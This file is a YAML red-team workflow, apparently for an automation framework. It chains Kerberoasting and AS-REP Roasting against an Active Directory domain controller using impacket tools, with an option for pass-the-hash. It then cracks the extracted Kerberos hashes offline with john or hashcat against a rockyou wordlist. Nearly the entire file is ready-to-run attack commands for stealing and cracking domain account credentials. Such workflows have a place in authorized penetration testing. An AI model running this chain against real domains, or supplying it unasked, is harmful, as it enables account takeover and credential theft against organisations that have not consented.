name: kerberoast
description: |
  Kerberos attack workflow — discover and exploit Kerberoastable and
  AS-REP Roastable accounts in Active Directory using impacket tools,
  then attempt offline cracking of extracted hashes.
tags: [redteam, ad, kerberos, kerberoast, asrep]
dispatch:
  inputs:
    log_command:
      type: string
      default: "true"
      description: Enable command log entries for steps when set to true/false.
    log_output:
      type: string
      default: "true"
      description: Enable stdout output log files for steps when set to true/false.
    target:
      required: true
      type: string
      description: Domain controller IP
      alias: t
    domain:
      required: true
      type: string
      description: Domain name (e.g. corp.local)
    user:
      required: true
      type: string
      description: Domain username
    password:
      type: string
      default: ''
      description: Password
    hash:
      type: string
      default: ''
      description: NTLM hash for pass-the-hash
    wordlist:
      type: string
      default: /usr/share/wordlists/rockyou.txt
      description: Wordlist for cracking

jobs:
  kerberoast:
    name: Kerberoasting
    outputs:
      hash_count: '{{ steps["get-spn-tickets"].outputs.hash_count | default("", true) }}'
      hash_file: '{{ steps["get-spn-tickets"].outputs.hash_file | default("", true) }}'
    steps:
    - name: get-spn-tickets
      log-command: "{{ inputs.log_command | default(true) }}"
      run: |
        echo "[+] Kerberoasting {{ inputs.domain }}..."
        AUTH="{{ inputs.domain }}/{{ inputs.user }}"
        {% if inputs.password %}
        AUTH="$AUTH:{{ inputs.password }}"
        {% endif %}
        EXTRA=""
        {% if inputs.hash %}
        EXTRA="-hashes :{{ inputs.hash }}"
        {% endif %}

        impacket-GetUserSPNs "$AUTH" -dc-ip {{ inputs.target }} -request -outputfile ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt $EXTRA 2>&1 | tee ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast_log.txt

        if [ -f ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt ]; then
          COUNT=$(wc -l < ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt)
          echo "hash_count=$COUNT" >> {{ env.OFX_OUTPUTS }}
          echo "hash_file=${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt" >> {{ env.OFX_OUTPUTS }}
          echo "[+] Got $COUNT TGS hashes"
        else
          echo "hash_count=0" >> {{ env.OFX_OUTPUTS }}
          echo "[-] No kerberoastable accounts found"
        fi
      continue-on-error: true

  asrep-roast:
    name: AS-REP Roasting
    outputs:
      asrep_count: '{{ steps["get-asrep-hashes"].outputs.asrep_count | default("", true) }}'
      asrep_file: '{{ steps["get-asrep-hashes"].outputs.asrep_file | default("", true) }}'
    steps:
    - name: get-asrep-hashes
      log-command: "{{ inputs.log_command | default(true) }}"
      run: |
        echo "[+] AS-REP Roasting {{ inputs.domain }}..."
        AUTH="{{ inputs.domain }}/{{ inputs.user }}"
        {% if inputs.password %}
        AUTH="$AUTH:{{ inputs.password }}"
        {% endif %}
        EXTRA=""
        {% if inputs.hash %}
        EXTRA="-hashes :{{ inputs.hash }}"
        {% endif %}

        impacket-GetNPUsers "$AUTH" -dc-ip {{ inputs.target }} -request -outputfile ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt $EXTRA 2>&1 | tee ${OFX_RUN_DIR:-/tmp}/ofx_asrep_log.txt

        if [ -f ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt ]; then
          COUNT=$(wc -l < ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt)
          echo "asrep_count=$COUNT" >> {{ env.OFX_OUTPUTS }}
          echo "asrep_file=${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt" >> {{ env.OFX_OUTPUTS }}
          echo "[+] Got $COUNT AS-REP hashes"
        else
          echo "asrep_count=0" >> {{ env.OFX_OUTPUTS }}
          echo "[-] No AS-REP roastable accounts found"
        fi
      continue-on-error: true

  crack:
    name: Hash Cracking
    needs: [kerberoast, asrep-roast]
    steps:
    - name: crack-hashes
      run: |
        echo "[+] Attempting offline crack..."

        # Kerberoast hashes (hashcat mode 13100)
        {% if jobs['kerberoast'].outputs.hash_count | default(0, true) | int > 0 %}
        echo "--- Kerberoast (TGS) ---"
        if command -v john &>/dev/null; then
          john --wordlist={{ inputs.wordlist }} ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt 2>/dev/null
          john --show ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt 2>/dev/null | tee ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast_cracked.txt
        elif command -v hashcat &>/dev/null; then
          hashcat -m 13100 ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast.txt {{ inputs.wordlist }} --force -o ${OFX_RUN_DIR:-/tmp}/ofx_kerberoast_cracked.txt 2>/dev/null || true
        fi
        {% endif %}

        # AS-REP hashes (hashcat mode 18200)
        {% if jobs['asrep-roast'].outputs.asrep_count | default(0, true) | int > 0 %}
        echo "--- AS-REP ---"
        if command -v john &>/dev/null; then
          john --wordlist={{ inputs.wordlist }} ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt 2>/dev/null
          john --show ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt 2>/dev/null | tee ${OFX_RUN_DIR:-/tmp}/ofx_asrep_cracked.txt
        elif command -v hashcat &>/dev/null; then
          hashcat -m 18200 ${OFX_RUN_DIR:-/tmp}/ofx_asrep.txt {{ inputs.wordlist }} --force -o ${OFX_RUN_DIR:-/tmp}/ofx_asrep_cracked.txt 2>/dev/null || true
        fi
        {% endif %}

        echo "[+] Cracking complete"
      log-stdout: "{{ inputs.log_output | default(true) }}"
      log-command: "{{ inputs.log_command | default(true) }}"
      continue-on-error: true
